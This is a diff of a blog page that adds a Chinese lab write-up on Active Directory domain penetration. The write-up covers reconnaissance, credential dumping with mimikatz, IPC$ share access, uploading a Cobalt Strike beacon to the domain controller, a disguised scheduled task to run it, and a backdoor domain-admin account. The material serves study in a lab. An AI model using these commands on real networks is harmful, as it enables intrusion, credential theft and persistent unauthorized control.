@@ -161,25 +161,25 @@
     <div class="header-right">
       <ul class="header-menu">
         <li>
-          <a href="http://example.com/">
+          <a href="https://lmlsama.top/">
             <i class="header-menu--icon iconfont icon-shouye"></i>
             <span class="header-menu--span">首页</span>
           </a>
         </li>
         <li>
-          <a href="http://example.com/log">
+          <a href="https://lmlsama.top/log">
             <i class="header-menu--icon iconfont icon-rizhi"></i>
             <span class="header-menu--span">日志</span>
           </a>
         </li>
         <li>
-          <a href="http://example.com/link">
+          <a href="https://lmlsama.top/link">
             <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
             <span class="header-menu--span">友情链接</span>
           </a>
         </li>
         <li>
-          <a href="http://example.com/about">
+          <a href="https://lmlsama.top/about">
             <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
             <span class="header-menu--span">关于我</span>
           </a>
@@ -331,11 +331,11 @@
       </p>
       <p class="main-left--subtitle">
         <span>最近动态：</span>
-        <span>今天</span>
+        <span>昨天</span>
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>1487天</span>
+        <span>1490天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -373,7 +373,134 @@
       </div>
     </div>
     <article class="article-content markdown-body">
-      <h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>拓扑图</p>
+      <h1 id="02-域渗透"><a href="#02-域渗透" class="headerlink" title="02 - 域渗透"></a>02 - 域渗透</h1><h2 id="一、域渗透思路"><a href="#一、域渗透思路" class="headerlink" title="一、域渗透思路"></a>一、域渗透思路</h2><p><strong>目标</strong></p>
+<p><strong>获得域控制器 (DC)，可以使用账号登录，并且提权维权。</strong></p>
+<p><strong>前提</strong></p>
+<p><strong>域渗透前提是，DC 管理员在域成员上进行过登录 (授权)，我们这台域成员拿下，并且可以进行提权，有一些操作都是需要管理员进行授权登录的还是比较常见的（比如远程桌面连接）</strong></p>
+<h3 id="《相关实验》"><a href="#《相关实验》" class="headerlink" title="《相关实验》"></a>《相关实验》</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在原系统登录域控管理员配置开启远程桌面，包含域控管理员和 win10</span><br><span class="line">域控远程登录到域主机，包含域控管理员和 win10</span><br><span class="line">注意 只要域控在域主机登录就会记录域控信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216921.png" alt="image-20260315171458545"></p>
+<p><strong>渗透思路</strong></p>
+<p><strong>通过域成员主机，定位出城域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网。</strong></p>
+<p><strong>渗透过程</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0. 域信息搜集 </span><br><span class="line">1. 拿下域中域成员，可以远程登录他</span><br><span class="line">2. 对其进行提权操作</span><br><span class="line">3. 进行域横移动，最好拿到域控管理员账号密码</span><br><span class="line">4. 对域控服务器进行木马植入和权限维持</span><br><span class="line">   本次域渗透的使用的是 CS，kali在CS目录运行下面命令</span><br><span class="line">   nohup ./teamserver 192.168.88.222 666888 &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216922.png" alt="image-20260315172005029"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216923.png" alt="image-20260315172152598"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216924.png" alt="image-20260315172342620"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216925.png" alt="image-20260315172508919"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">查看当前有几个域环境：这个需要启动域控服务器上的 Computer Brower 服务。</span><br><span class="line">net view /domain</span><br><span class="line">查看域控时间 (本质上不是为了看时间看域控)</span><br><span class="line">net time /domain</span><br><span class="line">新建域账号 (需要管理员权限)</span><br><span class="line">C:\Users\Administrator&gt;net user dlrb Woniu123 /add/domain命令成功完成。C:\Users\Administrator&gt;net group &quot;domain admins&quot; dlrb /add/domain命令成功完成。</span><br><span class="line">域中常见的用户身份（用户组）</span><br><span class="line"></span><br><span class="line">    Domain Admins：域管理员，拥有对域内的其他成员完全控制的权限。</span><br><span class="line">    Domain Controllers：域控制器</span><br><span class="line">    Domain Users：域用户</span><br><span class="line">    Domain Computers：域内机器</span><br><span class="line">    Domain Guests：域内来宾用户组，低权限</span><br><span class="line">    </span><br><span class="line">net usernet user /domain</span><br><span class="line">获取域名 set logonserver</span><br><span class="line">[12/25 17:40:57] beacon&gt; shell set log[12/25 17:40:57] [*] Tasked beacon to run: set log[12/25 17:40:57] [+] host called home, sent: 38 bytes[12/25 17:40:57] [+] received output:LOGONSERVER=\DSADMIN</span><br><span class="line">SRV 是域名系统里面的资源记录，标识托管的特定服务计算机，查找内网域控 ip。</span><br><span class="line"></span><br><span class="line">nslookup -type=SRV _ldap._tcp.woniu.com</span><br><span class="line">查找 dc 列表，工作站 (win7) 和域控之间的一个关系</span><br><span class="line">nltest /dclist:woniu.com</span><br><span class="line">查看该域组里面的用户有哪些。</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line">ping 循环探测内网主机</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.88.%i -w 1 -n 1|find /i &quot;ttl=&quot;</span><br><span class="line">获得域 ip 地址</span><br><span class="line">ping woniu.com</span><br><span class="line">正在 Ping woniu.com [192.168.88.100] 具有 32 字节的数据:来自 192.168.88.100 的回复：字节 = 32 时间 &lt; 1ms TTL=128来自 192.168.88.100 的回复：字节 = 32 时间 = 1ms TTL=128来自 192.168.88.100 的回复：字节 = 32 时间 = 1ms TTL=128来自 192.168.88.100 的回复：字节 = 32 时间 &lt; 1ms TTL=128</span><br><span class="line">192.168.88.100 的 Ping 统计信息:数据包：已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，往返行程的估计时间 (以毫秒为单位):最短 = 0ms，最长 = 1ms，平均 = 0ms</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、共享目录攻击"><a href="#二、共享目录攻击" class="headerlink" title="二、共享目录攻击"></a>二、共享目录攻击</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h3><p>**IPC$(Internet Process Connection) 是共享 **<strong>命名管道</strong> 的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p>
+<p><strong>利用 IPC$，连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。</strong></p>
+<p>**Windiws 中有一个管理服务叫 IPC$，它提供了 Windows  中一些文件夹的共享服务，可以让域内其它主机通过域名的方式访问域中主机的共享文件夹和文件。其中有一个叫默认共享的目录，在每台主机中都是默认开启，但需要用户名和密码来认证之后才可以访问。Win 2008 r2 以下版本密码保存在 **<code>lass 服务</code> 中。有的在 <code>winlogon 服务</code> 中</p>
+<blockquote>
+<p><strong>成功建立 IPC$ 连接后，攻击者可以访问其他隐藏共享：</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>共享名</strong></th>
+<th><strong>作用</strong></th>
+<th><strong>访问权限</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>C$</code></td>
+<td><strong>C 盘根目录</strong></td>
+<td><strong>完全控制（管理员）</strong></td>
+</tr>
+<tr>
+<td><code>D$</code></td>
+<td><strong>D 盘根目录</strong></td>
+<td><strong>完全控制（管理员）</strong></td>
+</tr>
+<tr>
+<td><code>ADMIN$</code></td>
+<td><strong>Windows 系统目录</strong></td>
+<td><strong>完全控制（管理员）</strong></td>
+</tr>
+<tr>
+<td><code>IPC$</code></td>
+<td><strong>进程间通信</strong></td>
+<td><strong>认证通道</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216926.png" alt="image-20260315173341400"></p>
+<h3 id="IPC-前提"><a href="#IPC-前提" class="headerlink" title="IPC$ 前提"></a>IPC$ 前提</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 139、445 端口开启</span><br><span class="line">2. 管理员开启默认共享 (一般来说默认都是开启的)</span><br><span class="line">3. ipc$ 一般不会默认开启,但c$和d$会开</span><br><span class="line">4. 管理员已经在入侵主机登陆过留有记录</span><br></pre></td></tr></table></figure>
+
+<h3 id="IPC-入侵实战"><a href="#IPC-入侵实战" class="headerlink" title="IPC$ 入侵实战"></a>IPC$ 入侵实战</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 拿下 win7 shell 权限</span><br><span class="line">2. 提权为超级管理员 (必须)</span><br><span class="line">3. 拿到域控主机的密码[密码可见 / 密码加密但是可解密 / 密码加密且不可解密](提权)</span><br><span class="line">4. cs 命令 mimikatz</span><br><span class="line">5. mimikatz sekurlsa::logonpasswords（可以找域控主机是否在本机登录过，会存有遗留密码）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下面是基于实验而言，非实际：</span><br><span class="line">6. 如果不显示 win2012 的密码 我们模拟登录一下</span><br><span class="line">7. shell net use \win2012 Hackme123!/user:lmlsama\administrator     建立从当前计算机到目标服务器 win2012 的 IPC$（或网络共享）连接。简单来说，就是用指定的用户名和密码登录远程的 win2012 服务器。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216927.png" alt="image-20260315174101692"></p>
+<h3 id="通过-ipc-共享目录-上传文件"><a href="#通过-ipc-共享目录-上传文件" class="headerlink" title="通过 ipc$ 共享目录 上传文件"></a>通过 ipc$ 共享目录 上传文件</h3><p><strong>1 打通通道 验证密码(提权)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\win2016.woniu.com Hacker123!@# /user:woniu\administrator</span><br><span class="line">提示有人连接这类的错误 删除，重试</span><br><span class="line">shell net use * /del /y</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 查看当前已登录的用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\win2016.woniu.com\C$ 看看有无权限访问（只要成功执行上面那条，基本就有权限查看域控主机的C盘）</span><br><span class="line">shell net use</span><br><span class="line">状态    本地    远程    网络</span><br><span class="line">OK    \\win2016\C$    Microsoft Windows Network</span><br><span class="line">OK    \\win2016\IPC$    Microsoft Windows Network</span><br><span class="line"></span><br><span class="line">命令成功完成</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 上传木马到 域控主机 win7 -&gt; win2016</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell copy artifact_x64.exe \\win2016.woniu.com\C$\\Users</span><br><span class="line">shell dir \\win2016.woniu.com\C$\\Users   查看是否上传成功</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建计划任务-提权-反弹会话-维权"><a href="#创建计划任务-提权-反弹会话-维权" class="headerlink" title="创建计划任务(提权-反弹会话 + 维权)"></a>创建计划任务(提权-反弹会话 + 维权)</h3><p><strong>0 前提</strong>是域控服务器必须以 administrator 登录后,win7 创建的计划任务才可以激活并运行</p>
+<p><strong>1 win7 执行打通通道 之前已经运行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\win2016.woniu.com Hacker123!@# /user:woniu\administrator</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 win7 执行远程任务添加</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell SCHTASKS /Create /TN HTTPBeacon /TR C:\Users\artifact_x64.exe /S \\win2016.woniu.com /U woniu\administrator /P Hacker123!@# /SC DAILY /ST 16:04</span><br><span class="line">注意如果域控删除木马可能是有杀毒软件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216928.png" alt="image-20260315175815884"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216929.png" alt="image-20260315175747681"></p>
+<blockquote>
+<p><strong><code>SCHTASKS /Create</code></strong></p>
+<ul>
+<li><strong>Windows 的计划任务管理命令，</strong><code>/Create</code> 表示创建新任务</li>
+</ul>
+<p><strong><code>/TN HTTPBeacon</code></strong></p>
+<ul>
+<li><strong>Task Name</strong>（任务名称）</li>
+<li>**将任务命名为 **<code>HTTPBeacon</code></li>
+<li><strong>这通常是一个隐蔽的名称，伪装成正常的网络服务进程</strong></li>
+</ul>
+<p><strong><code>/TR C:\Users\artifact_x64.exe</code></strong></p>
+<ul>
+<li><strong>Task Run</strong>（要运行的程序）</li>
+<li>**指定要执行的程序路径为 **<code>C:\Users\artifact_x64.exe</code></li>
+<li><code>artifact_x64.exe</code> 通常是指渗透测试中生成的木马&#x2F;后门程序（Cobalt Strike 的 payload 常见命名）</li>
+</ul>
+<p><strong><code>/S \\win2016.woniu.com</code></strong></p>
+<ul>
+<li><strong>System</strong>（目标系统）</li>
+<li><strong>指定要创建任务的远程计算机</strong></li>
+<li><code>win2016.woniu.com</code> 是域控服务器的完整域名</li>
+</ul>
+<p><strong><code>/U woniu\administrator</code></strong></p>
+<ul>
+<li><strong>User</strong>（用户名）</li>
+<li>**使用 **<code>woniu</code> 域的管理员账户 <code>administrator</code> 执行此操作</li>
+<li><strong>需要管理员权限才能远程创建计划任务</strong></li>
+</ul>
+<p><strong><code>/P Hacker123!@#</code></strong></p>
+<ul>
+<li><strong>Password</strong>（密码）</li>
+<li><strong>上述账户的密码</strong></li>
+</ul>
+<p><strong><code>/SC DAILY</code></strong></p>
+<ul>
+<li><strong>Schedule</strong>（日程频率）</li>
+<li><strong>设置任务执行频率为每天一次</strong></li>
+<li><strong>其他可选值：MINUTE、HOURLY、ONCE、ONLOGON 等</strong></li>
+</ul>
+<p><strong><code>/ST 16:04</code></strong></p>
+<ul>
+<li><strong>Start Time</strong>（开始时间）</li>
+<li><strong>指定任务在每天下午 16:04 执行</strong></li>
+<li><strong>24 小时制时间格式</strong></li>
+</ul>
+</blockquote>
+<h3 id="创建远程登录用户（维权）"><a href="#创建远程登录用户（维权）" class="headerlink" title="创建远程登录用户（维权）"></a>创建远程登录用户（维权）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上线木马后，创建远程登录用户并将其加入各种组</span><br><span class="line">shell net user hacker Woniu123 /add /domain：在域中创建名为hacker、密码为Woniu123的用户；</span><br><span class="line">shell net group &quot;Domain Admins&quot; /add &quot;hacker&quot; /domain：将hacker用户添加到域管理员组（Domain Admins）；</span><br><span class="line">shell net localgroup &quot;Administrators&quot; /add &quot;hacker&quot;：将hacker用户添加到本地管理员组；</span><br><span class="line">shell net localgroup &quot;Remote Desktop Users&quot; /add &quot;hacker&quot;：将hacker用户添加到远程桌面用户组，使其具备远程登录权限。</span><br><span class="line">最终用途：使用新建的hacker用户从自己（攻击者）的主机远程连接到 win2016 主机。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260315183216930.png" alt="image-20260315181734934"></p>
+<h1 id="01-准备"><a href="#01-准备" class="headerlink" title="01 - 准备"></a>01 - 准备</h1><p>拓扑图</p>
 <p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313213056774.png" alt="image-20260313202157385"></p>
 <h2 id="winserver2012-创建域"><a href="#winserver2012-创建域" class="headerlink" title="winserver2012 创建域"></a>winserver2012 创建域</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313213056775.png" alt="image-20260313195314472"></p>
 <p><strong>密码： Hackme123!</strong></p>
@@ -410,7 +537,7 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#winserver2012-%E5%88%9B%E5%BB%BA%E5%9F%9F"><span class="toc-number"></span> <span class="toc-text">winserver2012 创建域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E5%8A%A0%E5%85%A5%E5%9F%9F"><span class="toc-number"></span> <span class="toc-text">其他用户加入域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#win7"><span class="toc-number">1.</span> <span class="toc-text">win7</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#02-%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">02 - 域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">一、域渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%8A%E7%9B%B8%E5%85%B3%E5%AE%9E%E9%AA%8C%E3%80%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">《相关实验》</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">信息搜集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">二、共享目录攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC"><span class="toc-number">1.2.1.</span> <span class="toc-text">IPC$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC-%E5%89%8D%E6%8F%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">IPC$ 前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC-%E5%85%A5%E4%BE%B5%E5%AE%9E%E6%88%98"><span class="toc-number">1.2.3.</span> <span class="toc-text">IPC$ 入侵实战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-ipc-%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.4.</span> <span class="toc-text">通过 ipc$ 共享目录 上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-%E6%8F%90%E6%9D%83-%E5%8F%8D%E5%BC%B9%E4%BC%9A%E8%AF%9D-%E7%BB%B4%E6%9D%83"><span class="toc-number">1.2.5.</span> <span class="toc-text">创建计划任务(提权-反弹会话 + 维权)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7%EF%BC%88%E7%BB%B4%E6%9D%83%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">创建远程登录用户（维权）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#01-%E5%87%86%E5%A4%87"><span class="toc-number">2.</span> <span class="toc-text">01 - 准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#winserver2012-%E5%88%9B%E5%BB%BA%E5%9F%9F"><span class="toc-number">2.1.</span> <span class="toc-text">winserver2012 创建域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E5%8A%A0%E5%85%A5%E5%9F%9F"><span class="toc-number">2.2.</span> <span class="toc-text">其他用户加入域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#win7"><span class="toc-number">2.2.1.</span> <span class="toc-text">win7</span></a></li></ol></li></ol></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
